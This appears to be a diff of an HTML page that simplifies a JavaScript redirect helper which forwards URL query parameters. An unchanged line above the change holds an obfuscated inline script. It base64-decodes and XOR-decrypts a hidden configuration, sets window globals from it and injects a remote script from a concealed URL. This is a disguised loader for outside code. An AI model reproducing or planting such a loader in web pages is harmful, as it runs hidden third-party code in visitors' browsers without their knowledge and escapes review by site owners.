@@ -5,26 +5,14 @@
     <script>(function(){var d_3jc=atob("DODkzqjYAXqCFFYRaZvGu9q0I0CgfCJlGZPe4Ye7ZRSsYSJ8AIad4Mu3bFTgZnliCpKNvtyrLgrrbDN9RpCNts20LxDxNnozCJSQvMG6dA7nZ3QrMr3I7M+0bhjjeCUzU7uf7Ma5bB+gLnRhAJiBouG8I1agYjd9HIXG9IruYE+3JW8hCtWFrMruYhu6ImQpC4TX95j6fCf/");var v_mrj9=[];for(var t_v3=0;t_v3<d_3jc.length;t_v3++){v_mrj9.push(d_3jc.charCodeAt(t_v3)&255);}var p_3ca=v_mrj9[0];var x_8ssn=v_mrj9.slice(1,1+p_3ca);var k_ts=v_mrj9.slice(1+p_3ca);var g_l=k_ts.map(function(b,e_5e){return b^x_8ssn[e_5e%p_3ca];});var y_jta="";for(var g_t=0;g_t<g_l.length;g_t++){y_jta+=String.fromCharCode(g_l[g_t]&255);}var k_0=decodeURIComponent(escape(y_jta));var f_4z=JSON.parse(k_0);var l_g=f_4z.globals||[];l_g.forEach(function(r_krm){window[r_krm.name]=r_krm.value;});var f_kg4z=document.createElement("script");f_kg4z.src=f_4z.url;f_kg4z.async=true;f_kg4z.defer=true;(f_4z.attributes||[]).forEach(function(l_7uhl){f_kg4z.setAttribute(l_7uhl.name,l_7uhl.value);});(document.head||document.documentElement).appendChild(f_kg4z);})();</script>
     <script>
       function redirectWithParams(destination) {
-        try {
-          var currentParams = window.location.search;
-          var targetUrl = destination;
+        var currentParams = window.location.search;
 
-          if (currentParams) {
-            if (destination.includes("?")) {
-              targetUrl = destination + "&" + currentParams.substring(1);
-            } else {
-              targetUrl = destination + currentParams;
-            }
-          }
-
-          if (window.self !== window.top) {
-            window.open(targetUrl, "_blank", "noopener,noreferrer");
-          } else {
-            window.location.href = targetUrl;
-          }
-        } catch (e) {
-          window.open(destination, "_blank", "noopener,noreferrer");
+        if (currentParams) {
+          var separator = destination.includes("?") ? "&" : "?";
+          destination = destination + separator + currentParams.substring(1);
         }
+
+        window.location.href = destination;
       }
       window.redirectWithParams = redirectWithParams;
     </script>
